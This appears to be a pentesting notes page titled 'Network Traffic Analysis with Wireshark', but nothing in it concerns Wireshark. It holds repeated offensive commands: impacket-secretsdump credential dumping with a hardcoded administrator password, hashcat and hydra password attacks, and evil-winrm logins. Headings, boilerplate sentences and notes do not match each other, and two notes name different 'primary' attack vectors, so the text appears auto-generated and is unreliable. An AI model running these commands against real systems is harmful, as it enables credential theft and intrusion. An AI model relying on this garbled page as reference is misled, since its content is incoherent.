---
TitleSEO: "Network Traffic Analysis with Wireshark | ZureFX"
TitlePost: "Network Traffic Analysis with Wireshark"
Author: "ZureFX"
Description: "Personal notes on Network Traffic Analysis with Wireshark. Quick reference for pentesting and CTF challenges."
Keywords: "cheatsheet, malware, linux, privilege escalation"
URL: "https://zurefx.github.io/notes/note-network-traffic-analysis-with-wireshark-936.html"
URL_IMAGES: ""
Date: "2025-12-25"
Tags: "Cheatsheet, Malware, Linux, Privilege Escalation"
Section: "notes"
Lang: "en"
main_img: "note-network-traffic-analysis-with-wireshark-936"
Permalink: "/notes/note-network-traffic-analysis-with-wireshark-936.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Windows Server 2019

### FTP

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.104.126.135
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.37.108.158 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p464,1521,5432 10.111.119.211 -oN scan.txt
```

The scheduled task ran with elevated privileges and could be abused for escalation. The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation.

## Joomla

### pwncat

- `SeDebugPrivilege`
- `Command Injection`
- `Subdomain Takeover`
- `psexec`

- `Kerberoasting`
- `LAPS Abuse`
- `nmap`

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.28.235.52/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.25.2.143
feroxbuster -h
```

- `pwncat`
- `SUID Binary`
- `impacket`
- `Constrained Delegation`
- `ffuf`
- `Cron Job`

## atexec

### DNS Rebinding

- `wpscan`
- `ldapsearch`
- `Remote Code Execution`
- `NFS No Root Squash`
- `crackmapexec`
- `Resource-Based Constrained Delegation`

The database credentials were hardcoded in the application source code. Token impersonation allowed elevation to SYSTEM privileges on the target. Weak file permissions allowed modification of critical system files.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.24.9.25
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.48.145.223
```

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.56.93.65
feroxbuster -h
```

Unconstrained delegation was enabled on the compromised machine. Initial enumeration revealed several interesting open ports on the target.

## Constrained Delegation

### MySQL

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.124.52.178
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.18.36.184
```

```powershell
nmap -sCV -p443,464,25 10.71.248.45 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.47.152.47
```

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.31.107.108
feroxbuster -h
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The application stored sensitive credentials in an unencrypted configuration file. The service was running without proper input validation, leading to injection vulnerabilities. Privilege escalation was possible due to misconfigured sudo permissions. The service account had excessive permissions assigned in Active Directory.

## Elasticsearch

### IDOR

Weak file permissions allowed modification of critical system files. Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.120.36.103/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.52.204.87 -u administrator -p 'P@ssw0rd!'
```

> **Note:** IDOR was identified as the primary attack vector in this scenario.

The scheduled task ran with elevated privileges and could be abused for escalation. Weak file permissions allowed modification of critical system files.

> **Note:** XXE was identified as the primary attack vector in this scenario.
